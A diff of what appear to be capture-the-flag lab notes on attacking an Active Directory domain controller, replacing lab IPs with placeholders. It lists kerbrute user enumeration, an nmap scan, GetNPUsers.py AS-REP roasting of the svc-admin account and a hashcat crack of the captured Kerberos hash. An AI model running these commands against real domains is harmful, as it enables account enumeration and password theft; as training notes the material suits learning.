@@ -40,9 +40,9 @@ ENUM4LINUX
                                   --dc
                                   -d
                                   -t
-                                          "./kerbrute userenum --dc 10.10.71.93 -d spookysec.local userlist.txt -t 100"
+                                          "./kerbrute userenum --dc <DC's_IP> -d spookysec.local userlist.txt -t 100"
 NMAP    
-                  1- "nmap -sV -sC -T4 <MACHINE_IP>"
+                  1- "nmap -sV -sC -T4 <DC's_IP>"
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 EXPLOIT    GetNPUsers.py   &&   HASHCAT
@@ -59,7 +59,7 @@ Retrieving Kerberos Tickets
 GetNPuser.py
                         1- "GetNPUsers.py  -h"
                         2- execute a command & and copy to file
-                            "GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin | tee ~/Downloads/hash.txt"
+                            "GetNPUsers.py -no-pass -dc-ip <DC's_IP> spookysec.local/svc-admin | tee ~/Downloads/hash.txt"
 HASHCAT
             1-  "hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
